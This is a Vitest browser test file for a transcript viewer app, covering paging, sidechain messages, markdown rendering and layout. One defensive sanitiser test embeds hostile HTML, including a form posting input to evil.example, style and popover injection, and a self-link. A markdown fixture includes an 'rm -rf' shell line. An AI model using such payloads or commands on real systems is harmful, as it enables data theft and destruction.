import { describe, it, expect } from 'vitest'
import { page, userEvent } from 'vitest/browser'
import type { TranscriptMessage, TranscriptPage } from '@shared/types'
import { TRANSCRIPT_PAGE_SIZE } from '@shared/types'
import type { SessionId } from '@shared/domain/ids'
import { renderApp } from './renderApp'
import { FIXTURE_SESSIONS, message, type FakeSession } from './fakeApiary'
import { clickRowAction, sidebarSession, stays, until } from './helpers'

describe('transcript', () => {
  it('a tree change naming one session refreshes only that session\'s open transcript', async () => {
    const { fake } = await renderApp()
    const idOf = (title: string): SessionId => FIXTURE_SESSIONS.find((s) => s.title === title)!.sessionId as SessionId
    const a = idOf('Fix CSV export bug')
    const b = idOf('Add worktree switcher')
    await userEvent.click(sidebarSession('Fix CSV export bug'))
    await clickRowAction('Add worktree switcher', 'split-session-button')
    await until(() => document.querySelectorAll('[data-testid="transcript"]').length === 2)
    await until(() => fake.callsTo('transcript').some((c) => c[0] === b))
    const refreshesOf = (id: string): number =>
      [...fake.callsTo('transcript'), ...fake.callsTo('transcriptAfter')].filter((c) => c[0] === id).length
    const before = { a: refreshesOf(a), b: refreshesOf(b) }
    fake.emit('treeChanged', { sessions: [a] })
    await until(() => refreshesOf(a) > before.a)
    await stays(() => refreshesOf(b) === before.b, 300, 'session B is not refreshed')
    fake.emit('treeChanged', { sessions: null })
    await until(() => refreshesOf(b) > before.b)
  })

  it('renders the conversation for the selected session', async () => {
    await renderApp()
    await userEvent.click(sidebarSession('Fix CSV export bug'))
    await expect.element(page.getByTestId('transcript')).toBeVisible()
    await until(() => page.getByTestId('message').elements().length > 0)
    await expect.element(page.getByTestId('message').elements()[0]).toMatchTextContent('the export is empty')
  })

  it('marks user and assistant messages distinctly', async () => {
    await renderApp()
    await userEvent.click(sidebarSession('Fix CSV export bug'))
    await until(() => page.getByTestId('message').elements().length > 0)
    const roles = page.getByTestId('message').elements().map((el) => el.getAttribute('data-role'))
    expect(roles).toContain('user')
    expect(roles).toContain('assistant')
  })

  it('switching sessions replaces the transcript', async () => {
    await renderApp()
    await userEvent.click(sidebarSession('Fix CSV export bug'))
    await until(() => page.getByTestId('message').elements().length > 0)
    await expect.element(page.getByTestId('message').elements()[0]).toMatchTextContent('the export is empty')

    await userEvent.click(sidebarSession('Add worktree switcher'))
    await expect.element(page.getByTestId('session-title')).toMatchTextContent('Add worktree switcher')
    await expect.element(page.getByTestId('transcript')).toBeVisible()
  })

  it('hides sidechain messages until the toggle is switched on', async () => {
    await renderApp()
    await userEvent.click(sidebarSession('Fix CSV export bug'))
    const toggle = page.getByTestId('sidechain-toggle')
    await expect.element(toggle).toBeVisible()
    await expect.element(toggle).not.toBeChecked()

    // The fixture session includes a sidechain (subagent) message: verify it is genuinely hidden
    // by default and appears once the toggle is switched on, rather than merely asserting the
    // toggle's own unchecked state (which a broken filter could still pass). Wait for the
    // transcript to actually finish loading first — otherwise "not visible" would trivially pass
    // while the pane is still empty, before the filter ever runs.
    await until(() => page.getByTestId('message').elements().length > 0)
    await expect.element(page.getByText('subagent side note')).not.toBeInTheDocument()
    await userEvent.click(toggle)
    await expect.element(page.getByText('subagent side note')).toBeVisible()
  })

  it('sanitises hostile markdown: no form, style, popover or same-page link, but a real link and text survive', async () => {
    // SEC-2: a transcript is untrusted content. This message tries a `<style>` restyle, a form
    // that could post typed input elsewhere, a top-layer popover, and a relative link that would
    // resolve to the app's own page with an attacker-chosen `?restore=` query.
    const hostile = [
      '<style>body{display:none}</style>',
      '<form action="https://evil.example/collect"><input name="q"><button>go</button></form>',
      '<div popover>surprise</div>',
      '[reload](?restore=%7B%7D)',
      '[docs](https://example.com/docs)',
    ].join('\n\n')
    const hostileSession: FakeSession = {
      sessionId: '66666666-6666-6666-6666-666666666666',
      title: 'Hostile transcript',
      projectPath: '/fixture/work-a',
      gitBranch: 'main',
      messages: [message('h1', 'assistant', hostile)],
    }
    await renderApp({ sessions: [hostileSession] })
    await userEvent.click(sidebarSession('Hostile transcript'))
    await until(() => page.getByTestId('message').elements().length > 0)
    const html = page.getByTestId('message').elements()[0].innerHTML
    expect(html).not.toContain('<style')
    expect(html).not.toContain('<form')
    expect(html).not.toContain('<button')
    expect(html).not.toContain('popover')
    expect(html).not.toMatch(/href="\?/)
    await expect.element(page.getByRole('link', { name: 'docs' })).toHaveAttribute('href', 'https://example.com/docs')
  })

  describe('paging a long session', () => {
    // A dedicated session, long enough (TOTAL messages, over the one-page limit) that
    // "Load earlier messages" is actually offered and a second page is available to fetch. Each
    // pad turn's text embeds its own index (see makeSession, which this mirrors) so a duplicated
    // page shows up as a message whose text is rendered twice, not as two indistinguishable blobs.
    // One short of two full pages: the first page is TRANSCRIPT_PAGE_SIZE (what main pages by, see
    // the contract suite), leaving EARLIER messages for the second.
    const EARLIER = 12
    const TOTAL = TRANSCRIPT_PAGE_SIZE + EARLIER
    const LONG_SESSION_ID = '55555555-5555-5555-5555-555555555555'
    const longSessionMessages = (): TranscriptMessage[] => {
      const msgs = [message('u0', 'user', 'start of the long session')]
      for (let i = 0; i < TOTAL - 1; i++) msgs.push(message(`a${String(i)}`, 'assistant', `pad-${String(i)} ${'x'.repeat(50)}`))
      return msgs
    }
    const longSession = (): FakeSession => ({
      sessionId: LONG_SESSION_ID,
      title: 'Long paging session',
      projectPath: '/fixture/work-a',
      gitBranch: 'main',
      messages: longSessionMessages(),
    })
    // Mirrors the fake's own page slicing (see fakeApiary.ts's `transcript`), so a
    // manually-resolved page here behaves exactly like the fake's real one would.
    const pageOf = (all: TranscriptMessage[], beforeIndex?: number): TranscriptPage => {
      const end = beforeIndex ?? all.length
      const start = Math.max(0, end - TRANSCRIPT_PAGE_SIZE)
      return { messages: all.slice(start, end), earlierCursor: start > 0 ? start : null, skippedLines: 0 }
    }

    it('"Load earlier messages" appears and loads a distinct earlier page', async () => {
      await renderApp({ sessions: [longSession()] })
      await userEvent.click(sidebarSession('Long paging session'))
      // Initial page holds the most recent page of the messages, so the very first user message
      // (dropped from the initial page) is not yet on screen.
      await until(() => page.getByTestId('message').elements().length === TRANSCRIPT_PAGE_SIZE)
      expect(page.getByText('start of the long session', { exact: true }).elements()).toHaveLength(0)

      const button = page.getByTestId('load-earlier')
      await expect.element(button).toBeVisible()
      // A raw click: scrolling the button into view, as a locator click does, would itself load
      // the page (scrolling to the top loads earlier messages by itself).
      ;(button.element() as HTMLButtonElement).click()

      await until(() => page.getByTestId('message').elements().length === TOTAL)
      expect(page.getByText('start of the long session', { exact: true }).elements()).toHaveLength(1)
      // All messages loaded: nothing earlier remains, so the button disappears.
      await expect.element(button).not.toBeInTheDocument()
    })

    it('button disables itself while a paging fetch is in flight', async () => {
      const { fake } = await renderApp({ sessions: [longSession()] })
      await userEvent.click(sidebarSession('Long paging session'))
      await until(() => page.getByTestId('message').elements().length === TRANSCRIPT_PAGE_SIZE)

      // Held open until this test releases it — an in-process fetch resolves before Playwright
      // could ever observe the disabled state otherwise.
      let resolveFetch: ((p: TranscriptPage) => void) | null = null
      fake.override('transcript', () => new Promise((resolve) => { resolveFetch = resolve }))

      const button = page.getByTestId('load-earlier')
      ;(button.element() as HTMLButtonElement).click()
      // The IPC round trip is asynchronous even for a fast local fetch, so the click handler's
      // synchronous state update (disabling the button) is observable before the response lands.
      await expect.element(button).toBeDisabled()

      // Once the (single, since only one earlier page exists) fetch resolves, the button is
      // removed entirely rather than staying enabled with nothing left to load.
      resolveFetch!(pageOf(longSessionMessages(), EARLIER))
      await expect.element(button).not.toBeInTheDocument()
    })

    it('a second rapid click while a page is in flight does not duplicate messages', async () => {
      const { fake } = await renderApp({ sessions: [longSession()] })
      await userEvent.click(sidebarSession('Long paging session'))
      await until(() => page.getByTestId('message').elements().length === TRANSCRIPT_PAGE_SIZE)

      let resolveFetch: ((p: TranscriptPage) => void) | null = null
      fake.override('transcript', () => new Promise((resolve) => { resolveFetch = resolve }))

      // Fire both clicks back to back on the raw element, bypassing whatever actionability
      // waiting a locator click would do (which would otherwise itself serialize the clicks by
      // waiting for the button to re-enable) so this exercises the in-flight guard rather than
      // any scheduling of the click itself.
      const button = page.getByTestId('load-earlier').element() as HTMLButtonElement
      button.click()
      button.click()
      resolveFetch!(pageOf(longSessionMessages(), EARLIER))

      await until(() => page.getByTestId('message').elements().length === TOTAL)
      // The earliest message (part of the earlier page) must appear exactly once, not twice — a
      // duplicated fetch would prepend the same page a second time.
      expect(page.getByText('start of the long session', { exact: true }).elements()).toHaveLength(1)
      expect(page.getByText(/^pad-0 /).elements()).toHaveLength(1)
      // Only one fetch was actually dispatched — the second click was a no-op.
      expect(fake.callsTo('transcript').filter((args) => args[1] === EARLIER)).toHaveLength(1)
    })

    it('A -> B -> A: a stale page from the first visit does not corrupt the second visit', async () => {
      const { fake } = await renderApp({ sessions: [longSession(), ...FIXTURE_SESSIONS] })
      await userEvent.click(sidebarSession('Long paging session'))
      await until(() => page.getByTestId('message').elements().length === TRANSCRIPT_PAGE_SIZE)
      let resolveStale: ((p: TranscriptPage) => void) | null = null
      fake.override('transcript', () => new Promise((resolve) => { resolveStale = resolve }))
      ;(page.getByTestId('load-earlier').element() as HTMLButtonElement).click()
      await expect.element(page.getByTestId('load-earlier')).toBeDisabled()
      // Only that one page is held: the visits below load as usual.
      fake.restore('transcript')
      await userEvent.click(sidebarSession('Add worktree switcher'))
      await expect.element(page.getByTestId('session-title')).toHaveTextContent('Add worktree switcher')
      await userEvent.click(sidebarSession('Long paging session'))
      await expect.element(page.getByTestId('session-title')).toHaveTextContent('Long paging session')
      await until(() => page.getByTestId('message').elements().length === TRANSCRIPT_PAGE_SIZE)

      resolveStale!(pageOf(longSessionMessages(), EARLIER))
      await stays(() => page.getByTestId('message').elements().length === TRANSCRIPT_PAGE_SIZE, 300, 'the second visit to keep its own page')
      expect(page.getByText('start of the long session', { exact: true }).elements()).toHaveLength(0)
      // The second visit's own cursor still pages, once, with nothing left over from the stale page.
      const button = page.getByTestId('load-earlier')
      await expect.element(button).toBeEnabled()
      ;(button.element() as HTMLButtonElement).click()
      await until(() => page.getByTestId('message').elements().length === TOTAL)
      expect(page.getByText('start of the long session', { exact: true }).elements()).toHaveLength(1)
      expect(page.getByText(/^pad-0 /).elements()).toHaveLength(1)
      await expect.element(button).not.toBeInTheDocument()
    })

    it('a rejected page shows the error and does not leave paging stuck', async () => {
      const { fake } = await renderApp({ sessions: [longSession(), ...FIXTURE_SESSIONS] })
      await userEvent.click(sidebarSession('Long paging session'))
      await until(() => page.getByTestId('message').elements().length === TRANSCRIPT_PAGE_SIZE)
      fake.override('transcript', () => Promise.reject(new Error('simulated paging failure')))
      ;(page.getByTestId('load-earlier').element() as HTMLButtonElement).click()
      await until(() => document.querySelector('[data-testid="transcript-error"]')?.textContent?.includes('simulated paging failure') === true)

      // Away and back: the in-flight guard was cleared, so Load earlier works again.
      fake.restore('transcript')
      await userEvent.click(sidebarSession('Add worktree switcher'))
      await expect.element(page.getByTestId('session-title')).toHaveTextContent('Add worktree switcher')
      await userEvent.click(sidebarSession('Long paging session'))
      await until(() => page.getByTestId('message').elements().length === TRANSCRIPT_PAGE_SIZE)
      const button = page.getByTestId('load-earlier')
      await expect.element(button).toBeEnabled()
      ;(button.element() as HTMLButtonElement).click()
      await until(() => page.getByTestId('message').elements().length === TOTAL)
      await expect.element(button).not.toBeInTheDocument()
    })
  })

  describe('markdown rendering', () => {
    // Regression test: MessageRow used to render a text block as a plain <p> with the raw
    // markdown source, so a heading or fenced code block showed up as literal `##`/backtick
    // characters instead of being formatted. Assert on actual rendered structure — a heading
    // element and a <pre><code> block — not just that the text is present somewhere, which a
    // broken plain-text render would also satisfy.
    it('renders headings and fenced code blocks as formatted markdown, not raw source', async () => {
      const md = '## A heading\n\nSome `inline code` and:\n\n```js\nconsole.log(1)\n```\n'
      const session: FakeSession = {
        sessionId: 'cccccccc-cccc-cccc-cccc-cccccccccccc',
        title: 'Markdown message',
        projectPath: '/fixture/work-a',
        gitBranch: 'main',
        messages: [
          message('u1', 'user', 'show me formatting'),
          { uuid: 'md1', role: 'assistant', timestampMs: Date.now(), isSidechain: false, blocks: [{ type: 'text', text: md }] },
        ],
      }
      await renderApp({ sessions: [session] })
      await userEvent.click(sidebarSession('Markdown message'))
      await until(() => [...document.querySelectorAll<HTMLElement>('[data-testid="message"]')]
        .some((m) => m.textContent?.includes('A heading') === true))
      const found = [...document.querySelectorAll<HTMLElement>('[data-testid="message"]')]
        .find((m) => m.textContent?.includes('A heading') === true)
      if (found === undefined) throw new Error('no message with the heading')

      await expect.element(found.querySelector('h2')!).toMatchTextContent('A heading')
      await expect.element(found.querySelector<HTMLElement>('p > code')!).toMatchTextContent('inline code')
      await expect.element(found.querySelector<HTMLElement>('pre code')!).toMatchTextContent('console.log(1)')
      // The raw markdown syntax itself must not leak into the rendered text.
      expect(found.textContent).not.toContain('##')
      expect(found.textContent).not.toContain('```')
    })

    it('strikes through only ~~double~~ tildes: a pasted shell prompt with ~ in it stays plain text', async () => {
      const md = 'nuwan@nuwan-HP:~$ rm -rf /run/media/x && ls -A\nnuwan@nuwan-HP:~$\n\nand ~~gone~~ here'
      const session: FakeSession = {
        sessionId: 'cccccccc-cccc-cccc-cccc-ccccccccccc3',
        title: 'Tilde message',
        projectPath: '/fixture/work-a',
        gitBranch: 'main',
        messages: [{ uuid: 't1', role: 'user', timestampMs: Date.now(), isSidechain: false, blocks: [{ type: 'text', text: md }] }],
      }
      await renderApp({ sessions: [session] })
      await userEvent.click(sidebarSession('Tilde message'))
      await until(() => [...document.querySelectorAll('[data-testid="message"]')].some((m) => m.textContent?.includes('gone') === true))
      const struck = [...document.querySelectorAll('del, s')].map((d) => d.textContent)
      expect(struck).toEqual(['gone'])
      expect(document.body.textContent).toContain('nuwan@nuwan-HP:~$ rm -rf')
    })

    it('keeps a list\'s own numbers, a table column\'s alignment and a task list\'s checkboxes', async () => {
      // The MR desk numbers its "Still waiting on you" items after the update's own (3., 4., 5.).
      const md = [
        'Still waiting on you:', '', '3. [!76](https://example.com/76) can be approved', '4. !64 is safe',
        '', '- 6. !12 bulleted', '- 7. !13 bulleted', '', '| MR | Age |', '| :-- | --: |', '| !76 | 2 d |',
        '', '- [x] reviewed', '- [ ] approved',
      ].join('\n')
      const session: FakeSession = {
        sessionId: 'cccccccc-cccc-cccc-cccc-ccccccccccc4',
        title: 'List message',
        projectPath: '/fixture/work-a',
        gitBranch: 'main',
        messages: [{ uuid: 'l1', role: 'assistant', timestampMs: Date.now(), isSidechain: false, blocks: [{ type: 'text', text: md }] }],
      }
      await renderApp({ sessions: [session] })
      await userEvent.click(sidebarSession('List message'))
      await until(() => document.querySelector('[data-testid="message"] ol') !== null)
      const firsts = [...document.querySelectorAll('[data-testid="message"] ol')].map((ol) => (ol as HTMLOListElement).start)
      expect(firsts).toEqual([3, 6, 7])
      expect([...document.querySelectorAll('[data-testid="message"] td')].map((td) => td.getAttribute('align')))
        .toEqual(['left', 'right'])
      const boxes = [...document.querySelectorAll<HTMLInputElement>('[data-testid="message"] input')]
      expect(boxes.map((b) => [b.type, b.checked, b.disabled])).toEqual([['checkbox', true, true], ['checkbox', false, true]])
    })

    it('puts a Copy button on a code block, which copies the code alone, and none in a hostile message', async () => {
      const command = 'claude mcp add slack-multi --scope user -- uv run --directory ~/projects/slack-multi-workspace-mcp slack-multi-workspace-mcp'
      const md = `To use it, run:\n\n\`\`\`\n${command}\n\`\`\`\n\n<button class="code-copy">fake</button>`
      const session: FakeSession = {
        sessionId: 'cccccccc-cccc-cccc-cccc-ccccccccccc2',
        title: 'Command message',
        projectPath: '/fixture/work-a',
        gitBranch: 'main',
        messages: [
          message('u1', 'user', 'how do I add it'),
          { uuid: 'cmd1', role: 'assistant', timestampMs: Date.now(), isSidechain: false, blocks: [{ type: 'text', text: md }] },
        ],
      }
      const { fake } = await renderApp({ sessions: [session] })
      await userEvent.click(sidebarSession('Command message'))
      await expect.element(page.getByTestId('code-copy')).toBeVisible()
      // Only the app's own button: the message's `<button>` is sanitised away.
      expect(document.querySelectorAll('.code-copy')).toHaveLength(1)
      await userEvent.click(page.getByTestId('code-copy'))
      await until(() => fake.state.copied.length === 1)
      expect(fake.state.copied).toEqual([command])
      await expect.element(page.getByTestId('code-copy')).toMatchTextContent('Copied')
    })
  })

  describe('tool block chevron', () => {
    // Regression test: the chevron used to be the row's last flex child with no spacer of its
    // own — `.tool-preview` (flex: 1) was the only thing pushing it to the right edge, and that
    // element is removed entirely once the block expands (there is no preview text once the full
    // payload is showing). With nothing left to push against, the chevron collapsed back to sit
    // immediately after the tool name instead of staying in a fixed place, reading as a visible
    // jump to the left on every expand/collapse.
    it('the expand chevron stays in the same place when a tool block is expanded', async () => {
      const session: FakeSession = {
        sessionId: 'dddddddd-dddd-dddd-dddd-dddddddddddd',
        title: 'Tool block session',
        projectPath: '/fixture/work-a',
        gitBranch: 'main',
        messages: [
          message('u1', 'user', 'read a file'),
          {
            uuid: 'tool1',
            role: 'assistant',
            timestampMs: Date.now(),
            isSidechain: false,
            blocks: [{ type: 'tool_use', id: 't1', name: 'Read', input: { file_path: '/x.ts' } }],
          },
        ],
      }
      await renderApp({ sessions: [session] })
      await userEvent.click(sidebarSession('Tool block session'))
      await until(() => document.querySelector('.tool-head') !== null)
      const head = document.querySelector<HTMLElement>('.tool-head')!
      const chevron = head.querySelector<HTMLElement>('.chevron')!
      await expect.element(chevron).toBeVisible()

      // Measured from the head's right edge, not the window, so only the chevron's own place in
      // its row counts, not where the row is.
      const fromRight = (): number => head.getBoundingClientRect().right - chevron.getBoundingClientRect().right
      const before = fromRight()
      await userEvent.click(head)
      await until(() => document.querySelector('.tool-body') !== null)
      // The chevron turns over 120ms; measured mid-turn its box is wider (a 16px square at 45° is
      // 22.6px across, which moved its edge 3.3px on a busy run), so wait for the turn to end.
      await Promise.all(chevron.getAnimations().map((a) => a.finished))

      expect(Math.abs(fromRight() - before)).toBeLessThanOrEqual(1)
    })
  })
})
